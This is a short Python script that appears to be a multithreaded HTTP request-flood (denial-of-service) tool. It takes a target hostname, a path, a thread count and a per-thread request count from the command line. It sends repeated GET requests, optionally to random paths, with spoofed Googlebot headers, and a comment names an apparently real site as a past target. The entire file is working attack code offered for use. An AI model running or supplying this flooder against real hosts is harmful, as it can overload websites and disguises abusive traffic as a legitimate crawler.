#!/usr/bin/python3
# encoding = utf-8

import random
import string
import threading
import sys
from datetime import datetime

import requests

url_protocol = "https"
url_hostname = sys.argv[1]
# url_hostname = input("Input hostname: ")
# url_hostname = "cxt.gss-proshop.com"
# print("Hostname: {:}".format(url_hostname))
url_base = "{:}://{:}".format(url_protocol, url_hostname)
letters_tmp = string.hexdigits

threads_limit = int(sys.argv[3])
attack_limit = int(sys.argv[4])
attack_uri = sys.argv[2]

request_header = {
    "User-Agent": "GoogleBot/1.0",
    "HOST": url_hostname,
    "AMP-CACHE-TRANSFORM": "google;v=\"1..8\"",
    "CONNECTION": "keep-alive",
    "ACCEPT": "text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8",
    "FROM": "googlebot(at)googlebot.com",
    "USER-AGENT": "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "ACCEPT-ENCODING": "gzip, deflate, br",
    # "IF-MODIFIED-SINCE": "Fri, 24 Jun 2022 02:48:17 GMT",
}


class attackerClass(threading.Thread):
    """
    attackerClass(counter_min, counter_max)
    """

    def __init__(self, url_base, attack_limit, attack_uri):
        threading.Thread.__init__(self)
        self.url_base = url_base
        self.attack_limit = attack_limit
        self.attack_uri = attack_uri

    def run(self):
        for counter_tmp in range(1, self.attack_limit+1):
            if self.attack_uri.lower() == "r":
                self.attack_uri = "/"
                uri_len_range = round(random.random() * 20)
                for uri_len_counter in range(uri_len_range):
                    self.attack_uri = self.attack_uri + random.choice(letters_tmp)
            url_url = "{:}{:}".format(self.url_base, self.attack_uri)

            time_format = "%Y.%m.%d %H:%M:%S.%f"
            time_stamp = datetime.strftime(datetime.now(), time_format)
            print_msg = "Time: {:}, Counter: {:}/{:}, URL: {:}, ".format(time_stamp, counter_tmp, self.attack_limit, url_url)
            try:
                response_obj = requests.request(method="GET", url=url_url, timeout=5, headers=request_header)
                print_msg = print_msg + "status code: {:}".format(response_obj.status_code)
            except Exception as e:
                print_msg = print_msg + "exception: {:}".format(e)
            else:
                pass

            print(print_msg)


if __name__ == '__main__':
    for counter_tmp in range(1, threads_limit+1):
        thread_tmp = attackerClass(url_base, attack_limit, attack_uri)
        thread_tmp.start()
